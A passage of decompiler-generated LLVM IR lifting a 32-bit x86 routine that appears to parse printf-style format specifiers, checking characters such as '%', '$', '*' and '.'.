  store i32 %v3_804ed44, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ed48

dec_label_pc_804ed48:                             ; preds = %dec_label_pc_804ed39, %dec_label_pc_804ed41
  %v0_804ed6332 = phi i32 [ %v1_804ed41137, %dec_label_pc_804ed39 ], [ %v3_804ed44, %dec_label_pc_804ed41 ]
  %v4_804ed4928 = phi i32 [ %v6_804ed49139, %dec_label_pc_804ed39 ], [ %v3_804ed41, %dec_label_pc_804ed41 ]
  %v1_804ed48 = add i32 %v0_804ed48138, 1
  store i32 %v1_804ed48, i32* @esi, align 4
  %v1_804ed49 = inttoptr i32 %v1_804ed48 to i8*
  %v2_804ed49 = load i8, i8* %v1_804ed49, align 1
  %v3_804ed49 = zext i8 %v2_804ed49 to i32
  %v5_804ed49 = and i32 %v4_804ed4928, -256
  %v6_804ed49 = or i32 %v3_804ed49, %v5_804ed49
  store i32 %v6_804ed49, i32* %eax.global-to-local, align 4
  %v2_804ed4b = sext i8 %v2_804ed49 to i32
  store i32 %v2_804ed4b, i32* @ecx, align 4
  %v2_804ed4e = mul nsw i32 %v2_804ed4b, 2
  %v3_804ed4e = add i32 %v2_804ed4e, %v0_804ed31
  %v4_804ed4e = inttoptr i32 %v3_804ed4e to i8*
  %v5_804ed4e = load i8, i8* %v4_804ed4e, align 1
  %v6_804ed4e = and i8 %v5_804ed4e, 8
  %v7_804ed4e = icmp eq i8 %v6_804ed4e, 0
  %v1_804ed53 = icmp eq i1 %v7_804ed4e, false
  br i1 %v1_804ed53, label %dec_label_pc_804ed39, label %dec_label_pc_804ed55

dec_label_pc_804ed55:                             ; preds = %dec_label_pc_804ed48, %dec_label_pc_804ed2f
  %v1_804ed41.lcssa = phi i32 [ 0, %dec_label_pc_804ed2f ], [ %v0_804ed6332, %dec_label_pc_804ed48 ]
  %v0_804ed48.lcssa = phi i32 [ %v0_804ed49.pre, %dec_label_pc_804ed2f ], [ %v1_804ed48, %dec_label_pc_804ed48 ]
  %v2_804ed49.lcssa = phi i8 [ %v2_804ed49125, %dec_label_pc_804ed2f ], [ %v2_804ed49, %dec_label_pc_804ed48 ]
  %v6_804ed49.lcssa = phi i32 [ %v6_804ed49128, %dec_label_pc_804ed2f ], [ %v6_804ed49, %dec_label_pc_804ed48 ]
  %v0_804ed55 = load i32, i32* @edx, align 4
  %v1_804ed55 = add i32 %v0_804ed55, -1
  %v2_804ed55 = inttoptr i32 %v1_804ed55 to i8*
  %v3_804ed55 = load i8, i8* %v2_804ed55, align 1
  %v12_804ed55 = icmp eq i8 %v3_804ed55, 37
  %v1_804ed59 = icmp eq i1 %v12_804ed55, false
  br i1 %v1_804ed59, label %dec_label_pc_804edec, label %dec_label_pc_804ed5f

dec_label_pc_804ed5f:                             ; preds = %dec_label_pc_804ed55
  %v10_804ed5f = icmp eq i8 %v2_804ed49.lcssa, 36
  %v1_804ed61 = icmp eq i1 %v10_804ed5f, false
  br i1 %v1_804ed61, label %dec_label_pc_804ed93, label %dec_label_pc_804ed63

dec_label_pc_804ed63:                             ; preds = %dec_label_pc_804ed5f
  %tmp89 = icmp slt i32 %v1_804ed41.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804ed93, label %dec_label_pc_804ed67

dec_label_pc_804ed67:                             ; preds = %dec_label_pc_804ed63
  %v1_804ed67 = add i32 %v0_804ed48.lcssa, 1
  store i32 %v1_804ed67, i32* @edx, align 4
  %v4_804ed6a = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804ed6a, label %dec_label_pc_804f034, label %dec_label_pc_804ed75

dec_label_pc_804ed75:                             ; preds = %dec_label_pc_804ed67
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804ed7d = sub i32 %v1_804ed41.lcssa, %stack_var_-88.1
  %v8_804ed7d = xor i32 %v1_804ed41.lcssa, %stack_var_-88.1
  %v9_804ed7d = xor i32 %v2_804ed7d, %v1_804ed41.lcssa
  %v10_804ed7d = and i32 %v9_804ed7d, %v8_804ed7d
  %v11_804ed7d = icmp slt i32 %v10_804ed7d, 0
  %v12_804ed7d = icmp eq i32 %v2_804ed7d, 0
  %v13_804ed7d = icmp slt i32 %v2_804ed7d, 0
  %v3_804ed7f = icmp ne i1 %v13_804ed7d, %v11_804ed7d
  %v4_804ed7f = or i1 %v12_804ed7d, %v3_804ed7f
  %stack_var_-88.1.v0_804ed81 = select i1 %v4_804ed7f, i32 %stack_var_-88.1, i32 %v1_804ed41.lcssa
  br label %dec_label_pc_804ed8f

dec_label_pc_804ed8f:                             ; preds = %dec_label_pc_804eda3, %dec_label_pc_804ed75, %dec_label_pc_804eda7
  %v0_804ed8f = phi i32 [ %v1_804ed67, %dec_label_pc_804ed75 ], [ %v0_804ed55, %dec_label_pc_804eda7 ], [ %v0_804ed55, %dec_label_pc_804eda3 ]
  %stack_var_-32.2 = phi i32 [ %v1_804ed41.lcssa, %dec_label_pc_804ed75 ], [ %stack_var_-32.1, %dec_label_pc_804eda7 ], [ %stack_var_-32.1, %dec_label_pc_804eda3 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804ed81, %dec_label_pc_804ed75 ], [ 0, %dec_label_pc_804eda7 ], [ 0, %dec_label_pc_804eda3 ]
  store i32 %v0_804ed8f, i32* @esi, align 4
  br label %dec_label_pc_804edb6

dec_label_pc_804ed93:                             ; preds = %dec_label_pc_804ed63, %dec_label_pc_804ed5f
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804eda3, label %dec_label_pc_804ed9a

dec_label_pc_804ed9a:                             ; preds = %dec_label_pc_804ed93
  %v10_804ed9a = icmp eq i8 %v2_804ed49.lcssa, 109
  br i1 %v10_804ed9a, label %dec_label_pc_804edec, label %dec_label_pc_804f034

dec_label_pc_804eda3:                             ; preds = %dec_label_pc_804ed93
  %tmp176 = icmp ugt i32 %v0_804ed48.lcssa, %v0_804ed55
  br i1 %tmp176, label %dec_label_pc_804eda7, label %dec_label_pc_804ed8f

dec_label_pc_804eda7:                             ; preds = %dec_label_pc_804eda3
  %v1_804eda7 = inttoptr i32 %v0_804ed55 to i8*
  %v2_804eda7 = load i8, i8* %v1_804eda7, align 1
  %v8_804eda7 = icmp eq i8 %v2_804eda7, 48
  br i1 %v8_804eda7, label %dec_label_pc_804ed8f, label %dec_label_pc_804edec

dec_label_pc_804edb6:                             ; preds = %dec_label_pc_804edc7, %dec_label_pc_804ed8f
  %v0_804ede2 = phi i32 [ %v1_804edc7, %dec_label_pc_804edc7 ], [ %v0_804ed8f, %dec_label_pc_804ed8f ]
  %v4_804edc035 = phi i32 [ %v6_804edc0, %dec_label_pc_804edc7 ], [ %v6_804ed49.lcssa, %dec_label_pc_804ed8f ]
  store i32 ptrtoint ([8 x i8]* @global_var_80531ea.107 to i32), i32* %edx.global-to-local, align 4
  %v1_804edc3 = inttoptr i32 %v0_804ede2 to i8*
  br label %dec_label_pc_804edc0

dec_label_pc_804edc0:                             ; preds = %dec_label_pc_804edd1, %dec_label_pc_804edb6
  %v4_804edc0 = phi i32 [ %v4_804edc035, %dec_label_pc_804edb6 ], [ %v6_804edc0, %dec_label_pc_804edd1 ]
  %v0_804edc2 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80531ea.107 to i32), %dec_label_pc_804edb6 ], [ %v1_804edc2, %dec_label_pc_804edd1 ]
  %v0_804edd1 = phi i32 [ 1, %dec_label_pc_804edb6 ], [ %v2_804edd1, %dec_label_pc_804edd1 ]
  store i32 %v0_804edd1, i32* @ecx, align 4
  %v1_804edc0 = inttoptr i32 %v0_804edc2 to i8*
  %v2_804edc0 = load i8, i8* %v1_804edc0, align 1
  %v3_804edc0 = zext i8 %v2_804edc0 to i32
  %v5_804edc0 = and i32 %v4_804edc0, -256
  %v6_804edc0 = or i32 %v3_804edc0, %v5_804edc0
  store i32 %v6_804edc0, i32* %eax.global-to-local, align 4
  %v1_804edc2 = add i32 %v0_804edc2, 1
  store i32 %v1_804edc2, i32* @edx, align 4
  %v2_804edc3 = load i8, i8* %v1_804edc3, align 1
  %v15_804edc3 = icmp eq i8 %v2_804edc3, %v2_804edc0
  %v1_804edc5 = icmp eq i1 %v15_804edc3, false
  br i1 %v1_804edc5, label %dec_label_pc_804edcc, label %dec_label_pc_804edc7

dec_label_pc_804edc7:                             ; preds = %dec_label_pc_804edc0
  %v1_804edc7 = add i32 %v0_804ede2, 1
  store i32 %v1_804edc7, i32* @esi, align 4
  %v0_804edc8 = load i32, i32* %edi.global-to-local, align 4
  %v2_804edc8 = or i32 %v0_804edc8, %v0_804edd1
  store i32 %v2_804edc8, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804edb6

dec_label_pc_804edcc:                             ; preds = %dec_label_pc_804edc0
  %v1_804edcc = inttoptr i32 %v1_804edc2 to i8*
  %v2_804edcc = load i8, i8* %v1_804edcc, align 1
  %v3_804edcc = icmp eq i8 %v2_804edcc, 0
  br i1 %v3_804edcc, label %dec_label_pc_804edd5, label %dec_label_pc_804edd1

dec_label_pc_804edd1:                             ; preds = %dec_label_pc_804edcc
  %v2_804edd1 = mul i32 %v0_804edd1, 2
  br label %dec_label_pc_804edc0

dec_label_pc_804edd5:                             ; preds = %dec_label_pc_804edcc
  %v0_804edd5 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804edd9 = udiv i32 %v0_804edd5, 2
  %v1_804edd9.not = or i32 %v1_804edd9, -6
  %v1_804edde = xor i32 %v1_804edd9.not, 5
  store i32 %v1_804edde, i32* %eax.global-to-local, align 4
  %v2_804ede0 = and i32 %v1_804edde, %v0_804edd5
  store i32 %v2_804ede0, i32* %edi.global-to-local, align 4
  %v1_804ede2 = add i32 %v0_804ede2, -1
  %v2_804ede2 = inttoptr i32 %v1_804ede2 to i8*
  %v3_804ede2 = load i8, i8* %v2_804ede2, align 1
  %v12_804ede2 = icmp eq i8 %v3_804ede2, 37
  %v1_804ede6 = icmp eq i1 %v12_804ede2, false
  br i1 %v1_804ede6, label %dec_label_pc_804ed18, label %dec_label_pc_804edec

dec_label_pc_804edec:                             ; preds = %dec_label_pc_804eda7, %dec_label_pc_804edd5, %dec_label_pc_804ed55, %dec_label_pc_804ed9a
  %v0_804ee0f = phi i32 [ %v1_804ed41.lcssa, %dec_label_pc_804ed9a ], [ %v1_804ed41.lcssa, %dec_label_pc_804eda7 ], [ 0, %dec_label_pc_804edd5 ], [ %v1_804ed41.lcssa, %dec_label_pc_804ed55 ]
  %v1_804ee18 = phi i32 [ %v0_804ed48.lcssa, %dec_label_pc_804ed9a ], [ %v0_804ed48.lcssa, %dec_label_pc_804eda7 ], [ %v0_804ede2, %dec_label_pc_804edd5 ], [ %v0_804ed48.lcssa, %dec_label_pc_804ed55 ]
  %v0_804ee15 = phi i32 [ %v0_804ed55, %dec_label_pc_804ed9a ], [ %v0_804ed55, %dec_label_pc_804eda7 ], [ %v1_804edc2, %dec_label_pc_804edd5 ], [ %v0_804ed55, %dec_label_pc_804ed55 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804ed9a ], [ %stack_var_-32.1, %dec_label_pc_804eda7 ], [ %stack_var_-32.2, %dec_label_pc_804edd5 ], [ %stack_var_-32.1, %dec_label_pc_804ed55 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804ed9a ], [ 0, %dec_label_pc_804eda7 ], [ %stack_var_-88.2, %dec_label_pc_804edd5 ], [ %stack_var_-88.1, %dec_label_pc_804ed55 ]
  %v1_804edec = inttoptr i32 %v0_804ee15 to i8*
  %v2_804edec = load i8, i8* %v1_804edec, align 1
  %v11_804edec = icmp eq i8 %v2_804edec, 42
  %v1_804edef = icmp eq i1 %v11_804edec, false
  br i1 %v1_804edef, label %dec_label_pc_804ee25, label %dec_label_pc_804edf1

dec_label_pc_804edf1:                             ; preds = %dec_label_pc_804edec
  %v4_804edf1 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804edf1, label %dec_label_pc_804ee15, label %dec_label_pc_804edf8

dec_label_pc_804edf8:                             ; preds = %dec_label_pc_804edf1
  %v1_804edf8 = inttoptr i32 %v1_804ee18 to i8*
  %v2_804edf8 = load i8, i8* %v1_804edf8, align 1
  %v11_804edf8 = icmp eq i8 %v2_804edf8, 36
  %v1_804edfb = icmp eq i1 %v11_804edf8, false
  br i1 %v1_804edfb, label %dec_label_pc_804f034, label %dec_label_pc_804ee01

dec_label_pc_804ee01:                             ; preds = %dec_label_pc_804edf8
  %tmp91 = icmp slt i32 %v0_804ee0f, 1
  br i1 %tmp91, label %dec_label_pc_804f034, label %dec_label_pc_804ee09

dec_label_pc_804ee09:                             ; preds = %dec_label_pc_804ee01
  store i32 %v8_804ed1f, i32* %eax.global-to-local, align 4
  %v1_804ee0e = add i32 %v1_804ee18, 1
  store i32 %v1_804ee0e, i32* @esi, align 4
  %v1_804ee0f = load i32, i32* @esp, align 4
  %v3_804ee0f = add i32 %v8_804ed1f, 68
  %v4_804ee0f = add i32 %v3_804ee0f, %v1_804ee0f
  %v5_804ee0f = inttoptr i32 %v4_804ee0f to i32*
  store i32 %v0_804ee0f, i32* %v5_804ee0f, align 4
  %v0_804ee53.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ee20

dec_label_pc_804ee15:                             ; preds = %dec_label_pc_804edf1
  %v1_804ee15 = add i32 %v0_804ee15, 1
  store i32 %v1_804ee15, i32* %eax.global-to-local, align 4
  %v12_804ee18 = icmp eq i32 %v1_804ee15, %v1_804ee18
  %v1_804ee1a = icmp eq i1 %v12_804ee18, false
  br i1 %v1_804ee1a, label %dec_label_pc_804f034, label %dec_label_pc_804ee20

dec_label_pc_804ee20:                             ; preds = %dec_label_pc_804ee15, %dec_label_pc_804ee09
  %v0_804ee53.pre.pre.pre = phi i32 [ %v1_804ee18, %dec_label_pc_804ee15 ], [ %v0_804ee53.pre.pre.pre.pre, %dec_label_pc_804ee09 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ee25

dec_label_pc_804ee25:                             ; preds = %dec_label_pc_804edec, %dec_label_pc_804ee20
  %v0_804ee53.pre.pre = phi i32 [ %v1_804ee18, %dec_label_pc_804edec ], [ %v0_804ee53.pre.pre.pre, %dec_label_pc_804ee20 ]
  %v0_804ecbe = phi i32 [ %v0_804ee0f, %dec_label_pc_804edec ], [ -2147483648, %dec_label_pc_804ee20 ]
  %v4_804ee25 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804ee25 = icmp eq i32 %v4_804ee25, 0
  %v1_804ee2a = icmp eq i1 %v5_804ee25, false
  %.pre = inttoptr i32 %v0_804ee53.pre.pre to i8*
  br i1 %v1_804ee2a, label %dec_label_pc_804ee4e, label %dec_label_pc_804ee30

dec_label_pc_804ee30:                             ; preds = %dec_label_pc_804ee25
  %v2_804ee30 = load i8, i8* %.pre, align 1
  %v11_804ee30 = icmp eq i8 %v2_804ee30, 46
  %v1_804ee33 = icmp eq i1 %v11_804ee30, false
  br i1 %v1_804ee33, label %dec_label_pc_804ee47, label %dec_label_pc_804ee35

dec_label_pc_804ee35:                             ; preds = %dec_label_pc_804ee30
  %v1_804ee35 = add i32 %v0_804ee53.pre.pre, 1
  store i32 %v1_804ee35, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804ed18.outer

dec_label_pc_804ee47:                             ; preds = %dec_label_pc_804ee30
  br label %dec_label_pc_804ee4e

dec_label_pc_804ee4e:                             ; preds = %dec_label_pc_804ee25, %dec_label_pc_804ee47
  %stack_var_-96.2 = phi i32 [ %v0_804ecbe, %dec_label_pc_804ee47 ], [ %stack_var_-96.1.ph, %dec_label_pc_804ee25 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804ee47 ], [ %v0_804ecbe, %dec_label_pc_804ee25 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8053198.108 to i32), i32* @edx, align 4
  %v4_804ee53.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee53

dec_label_pc_804ee53:                             ; preds = %dec_label_pc_804ee5d, %dec_label_pc_804ee4e
  %v0_804ee5d = phi i32 [ %v1_804ee5d, %dec_label_pc_804ee5d ], [ ptrtoint ([9 x i8]* @global_var_8053198.108 to i32), %dec_label_pc_804ee4e ]
  %v4_804ee53 = phi i32 [ %v6_804ee53, %dec_label_pc_804ee5d ], [ %v4_804ee53.pre, %dec_label_pc_804ee4e ]
  %v2_804ee53 = load i8, i8* %.pre, align 1
  %v3_804ee53 = zext i8 %v2_804ee53 to i32
  %v5_804ee53 = and i32 %v4_804ee53, -256
  %v6_804ee53 = or i32 %v3_804ee53, %v5_804ee53
  store i32 %v6_804ee53, i32* %eax.global-to-local, align 4
  %v3_804ee55 = inttoptr i32 %v0_804ee5d to i8*
  %v4_804ee55 = load i8, i8* %v3_804ee55, align 1
  %v15_804ee55 = icmp eq i8 %v2_804ee53, %v4_804ee55
  br i1 %v15_804ee55, label %dec_label_pc_804ecc5, label %dec_label_pc_804ee5d

dec_label_pc_804ee5d:                             ; preds = %dec_label_pc_804ee53
  %v1_804ee5d = add i32 %v0_804ee5d, 1
  store i32 %v1_804ee5d, i32* @edx, align 4
  %v1_804ee5e = inttoptr i32 %v1_804ee5d to i8*
  %v2_804ee5e = load i8, i8* %v1_804ee5e, align 1
  %v3_804ee5e = icmp eq i8 %v2_804ee5e, 0
  %v1_804ee61 = icmp eq i1 %v3_804ee5e, false
  br i1 %v1_804ee61, label %dec_label_pc_804ee53, label %dec_label_pc_804ee63

dec_label_pc_804ee63:                             ; preds = %dec_label_pc_804ee5d, %dec_label_pc_804ecc5
  %v0_804ee76 = phi i32 [ %v1_804ecc5, %dec_label_pc_804ecc5 ], [ %v0_804ee53.pre.pre, %dec_label_pc_804ee5d ]
  %v0_804ee73 = phi i32 [ %v0_804ee5d, %dec_label_pc_804ecc5 ], [ %v1_804ee5d, %dec_label_pc_804ee5d ]
  %v1_804ee65 = add i32 %v0_804ee73, -134558104
  %v1_804ee6a = add i32 %v0_804ee73, -134558105
  %v5_804ee6a = sub i32 134558104, %v0_804ee73
  %v6_804ee6a = and i32 %v1_804ee65, %v5_804ee6a
  %v7_804ee6a = icmp slt i32 %v6_804ee6a, 0
  %v8_804ee6a = icmp eq i32 %v1_804ee6a, 0
  %v9_804ee6a = icmp slt i32 %v1_804ee6a, 0
  store i32 %v1_804ee6a, i32* %eax.global-to-local, align 4
  %v3_804ee6b = icmp eq i1 %v9_804ee6a, %v7_804ee6a
  %v4_804ee6b = icmp eq i1 %v8_804ee6a, false
  %v5_804ee6b = and i1 %v4_804ee6b, %v3_804ee6b
  br i1 %v5_804ee6b, label %dec_label_pc_804ee77, label %dec_label_pc_804ee6d

dec_label_pc_804ee6d:                             ; preds = %dec_label_pc_804ee63
  %v1_804ee6d = inttoptr i32 %v0_804ee76 to i8*
  %v2_804ee6d = load i8, i8* %v1_804ee6d, align 1
  %v3_804ee6d = zext i8 %v2_804ee6d to i32
  %v5_804ee6d = and i32 %v1_804ee6a, -256
  %v6_804ee6d = or i32 %v3_804ee6d, %v5_804ee6d
  store i32 %v6_804ee6d, i32* %eax.global-to-local, align 4
  %v3_804ee6f = inttoptr i32 %v0_804ee73 to i8*
  %v4_804ee6f = load i8, i8* %v3_804ee6f, align 1
  %v15_804ee6f = icmp eq i8 %v2_804ee6d, %v4_804ee6f
  %v1_804ee71 = icmp eq i1 %v15_804ee6f, false
  br i1 %v1_804ee71, label %dec_label_pc_804ee77, label %dec_label_pc_804ee73

dec_label_pc_804ee73:                             ; preds = %dec_label_pc_804ee6d
  %v1_804ee73 = add i32 %v0_804ee73, 9
  store i32 %v1_804ee73, i32* @edx, align 4
  %v1_804ee76 = add i32 %v0_804ee76, 1
  store i32 %v1_804ee76, i32* @esi, align 4
  br label %dec_label_pc_804ee77

dec_label_pc_804ee77:                             ; preds = %dec_label_pc_804ee6d, %dec_label_pc_804ee63, %dec_label_pc_804ee73
  %v4_804ee7e = phi i32 [ %v6_804ee6d, %dec_label_pc_804ee6d ], [ %v1_804ee6a, %dec_label_pc_804ee63 ], [ %v6_804ee6d, %dec_label_pc_804ee73 ]
  %v0_804ee7e = phi i32 [ %v0_804ee76, %dec_label_pc_804ee6d ], [ %v0_804ee76, %dec_label_pc_804ee63 ], [ %v1_804ee76, %dec_label_pc_804ee73 ]
  %v0_804ee77 = phi i32 [ %v0_804ee73, %dec_label_pc_804ee6d ], [ %v0_804ee73, %dec_label_pc_804ee63 ], [ %v1_804ee73, %dec_label_pc_804ee73 ]
  %v1_804ee77 = add i32 %v0_804ee77, 9
  %v2_804ee77 = inttoptr i32 %v1_804ee77 to i8*
  %v3_804ee77 = load i8, i8* %v2_804ee77, align 1
  %v4_804ee77 = sext i8 %v3_804ee77 to i32
  %v2_804ee7b = mul nsw i32 %v4_804ee77, 256
  store i32 %v2_804ee7b, i32* %ebx.global-to-local, align 4
  %v1_804ee7e = inttoptr i32 %v0_804ee7e to i8*
  %v2_804ee7e = load i8, i8* %v1_804ee7e, align 1
  %v3_804ee7e = zext i8 %v2_804ee7e to i32
  %v5_804ee7e = and i32 %v4_804ee7e, -256
  %v6_804ee7e = or i32 %v3_804ee7e, %v5_804ee7e
  store i32 %v6_804ee7e, i32* %eax.global-to-local, align 4
  %v4_804ee80 = icmp eq i8 %v2_804ee7e, 0
  br i1 %v4_804ee80, label %dec_label_pc_804f034, label %dec_label_pc_804ee88

dec_label_pc_804ee88:                             ; preds = %dec_label_pc_804ee77
  store i32 ptrtoint ([21 x i8]* @global_var_80531d5.109 to i32), i32* %ecx.global-to-local, align 4
  %v3_804ee8d = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804ee8d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ee91

dec_label_pc_804ee91:                             ; preds = %dec_label_pc_804eee0, %dec_label_pc_804ee88
  %v0_804eee0 = phi i32 [ %v1_804eee0, %dec_label_pc_804eee0 ], [ ptrtoint ([21 x i8]* @global_var_80531d5.109 to i32), %dec_label_pc_804ee88 ]
  %v3_804ee91 = inttoptr i32 %v0_804eee0 to i8*
  %v4_804ee91 = load i8, i8* %v3_804ee91, align 1
  %v15_804ee91 = icmp eq i8 %v2_804ee7e, %v4_804ee91
  %v1_804ee93 = icmp eq i1 %v15_804ee91, false
  br i1 %v1_804ee93, label %dec_label_pc_804eee0, label %dec_label_pc_804ee95

dec_label_pc_804ee95:                             ; preds = %dec_label_pc_804ee91
  %v1_804ee97 = add i32 %v0_804eee0, -134558165
  store i32 %v1_804ee97, i32* %edx.global-to-local, align 4
  %v7_804eea0 = icmp sgt i32 %v1_804ee97, 17
  br i1 %v7_804eea0, label %dec_label_pc_804eea2, label %dec_label_pc_804eeaa

dec_label_pc_804eea2:                             ; preds = %dec_label_pc_804ee95
  %v3_804eea2 = and i32 %v2_804ee7b, 1024
  %v4_804eea2 = icmp eq i32 %v3_804eea2, 0
  br i1 %v4_804eea2, label %dec_label_pc_804eeaa, label %dec_label_pc_804eea7

dec_label_pc_804eea7:                             ; preds = %dec_label_pc_804eea2
  %v1_804eea7 = add i32 %v0_804eee0, -134558167
  store i32 %v1_804eea7, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eeaa

dec_label_pc_804eeaa:                             ; preds = %dec_label_pc_804ee95, %dec_label_pc_804eea2, %dec_label_pc_804eea7
  %v0_804eeb3 = phi i32 [ %v1_804ee97, %dec_label_pc_804ee95 ], [ %v1_804ee97, %dec_label_pc_804eea2 ], [ %v1_804eea7, %dec_label_pc_804eea7 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80531cb.110 to i32), i32* %ecx.global-to-local, align 4
  %v2_804eeb3 = add i32 %tmp76, 32
  %v3_804eeb3 = inttoptr i32 %v2_804eeb3 to i32*
  store i32 %v0_804eeb3, i32* %v3_804eeb3, align 4
  %v0_804eeb6.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804eeba.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eeb6

dec_label_pc_804eeb6:                             ; preds = %dec_label_pc_804eeb6, %dec_label_pc_804eeaa
  %v0_804eeb6 = phi i32 [ %v1_804eeb6, %dec_label_pc_804eeb6 ], [ %v0_804eeb6.pre, %dec_label_pc_804eeaa ]
  %v1_804eeb6 = add i32 %v0_804eeb6, 1
  store i32 %v1_804eeb6, i32* %ecx.global-to-local, align 4
  %v1_804eeb7 = inttoptr i32 %v1_804eeb6 to i8*
  %v2_804eeb7 = load i8, i8* %v1_804eeb7, align 1
  %v3_804eeb7 = sext i8 %v2_804eeb7 to i32
  store i32 %v3_804eeb7, i32* %eax.global-to-local, align 4
  %v8_804eebc = icmp sgt i32 %v0_804eeba.pre, %v3_804eeb7
  br i1 %v8_804eebc, label %dec_label_pc_804eeb6, label %dec_label_pc_804eebe

dec_label_pc_804eebe:                             ; preds = %dec_label_pc_804eeb6
  store i32 ptrtoint ([21 x i8]* @global_var_80531d5.109 to i32), i32* @ecx, align 4
  %v1_804eec5 = add i32 %v0_804eeb6, -134558155
  store i32 %v1_804eec5, i32* %eax.global-to-local, align 4
  %v2_804eeca = add i32 %v0_804eeb6, add (i32 ptrtoint (i32* @global_var_80531bc.111 to i32), i32 -134558155)
  %v3_804eeca = add i32 %v2_804eeca, %v1_804eec5
  %v4_804eeca = inttoptr i32 %v3_804eeca to i16*
  %v5_804eeca = load i16, i16* %v4_804eeca, align 2
  %v6_804eeca = sext i16 %v5_804eeca to i32
  store i32 %v6_804eeca, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804eec5, 2
  %v3_804eed2 = add i32 %factor, 134558124
  %v4_804eed2 = inttoptr i32 %v3_804eed2 to i16*
  %v5_804eed2 = load i16, i16* %v4_804eed2, align 2
  %v6_804eed2 = sext i16 %v5_804eed2 to i32
  store i32 %v6_804eed2, i32* %eax.global-to-local, align 4
  %v1_804eeda = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eeda = or i32 %v1_804eeda, %v6_804eeca
  %v2_804eedc = and i32 %v2_804eeda, %v6_804eed2
  store i32 %v2_804eedc, i32* %edx.global-to-local, align 4
  %v0_804eeee.pre = load i32, i32* @esi, align 4
  %v0_804eef1.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804eee6

dec_label_pc_804eee0:                             ; preds = %dec_label_pc_804ee91
  %v1_804eee0 = add i32 %v0_804eee0, 1
  store i32 %v1_804eee0, i32* @ecx, align 4
  %v1_804eee1 = inttoptr i32 %v1_804eee0 to i8*
  %v2_804eee1 = load i8, i8* %v1_804eee1, align 1
  %v3_804eee1 = icmp eq i8 %v2_804eee1, 0
  %v1_804eee4 = icmp eq i1 %v3_804eee1, false
  br i1 %v1_804eee4, label %dec_label_pc_804ee91, label %dec_label_pc_804eee6

dec_label_pc_804eee6:                             ; preds = %dec_label_pc_804eee0, %dec_label_pc_804eebe
  %v0_804eef1 = phi i32 [ %v0_804eef1.pre, %dec_label_pc_804eebe ], [ %storemerge4, %dec_label_pc_804eee0 ]
  %v0_804eeee = phi i32 [ %v0_804eeee.pre, %dec_label_pc_804eebe ], [ %v0_804ee7e, %dec_label_pc_804eee0 ]
  %v0_804eee6 = phi i32 [ %v2_804eedc, %dec_label_pc_804eebe ], [ %v3_804ee8d, %dec_label_pc_804eee0 ]
  store i32 %v0_804eee6, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804eeee = inttoptr i32 %v0_804eeee to i8*
  %v2_804eeee = load i8, i8* %v1_804eeee, align 1
  %v3_804eeee = sext i8 %v2_804eeee to i32
  store i32 %v3_804eeee, i32* %eax.global-to-local, align 4
  %v2_804eef1 = add i32 %tmp76, 4
  %v3_804eef1 = inttoptr i32 %v2_804eef1 to i32*
  store i32 %v0_804eef1, i32* %v3_804eef1, align 4
  %v0_804eef4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eef4 = load i32, i32* @edx, align 4
  %v2_804eef4 = add i32 %v1_804eef4, 12
  %v3_804eef4 = inttoptr i32 %v2_804eef4 to i32*
  store i32 %v0_804eef4, i32* %v3_804eef4, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804eefb = load i32, i32* @edx, align 4
  %v1_804eefb = add i32 %v0_804eefb, 28
  %v2_804eefb = inttoptr i32 %v1_804eefb to i32*
  store i32 1, i32* %v2_804eefb, align 4
  %v0_804ef02 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ef02 = load i32, i32* @edx, align 4
  %v2_804ef02 = add i32 %v1_804ef02, 8
  %v3_804ef02 = inttoptr i32 %v2_804ef02 to i32*
  store i32 %v0_804ef02, i32* %v3_804ef02, align 4
  %v0_804ef05 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ef0f = and i32 %v0_804ef05, -5
  %v0_804ef15 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ef15 = and i32 %v0_804ef15, 3840
  store i32 %v1_804ef15, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804ef1e = or i32 %v1_804ef15, %v1_804ef0f
  store i32 %v2_804ef1e, i32* @edi, align 4
  %v1_804ef20 = load i32, i32* @edx, align 4
  %v2_804ef20 = add i32 %v1_804ef20, 20
  %v3_804ef20 = inttoptr i32 %v2_804ef20 to i32*
  store i32 48, i32* %v3_804ef20, align 4
  %v0_804ef23 = load i32, i32* @edi, align 4
  %v1_804ef23 = load i32, i32* @edx, align 4
  %v2_804ef23 = add i32 %v1_804ef23, 16
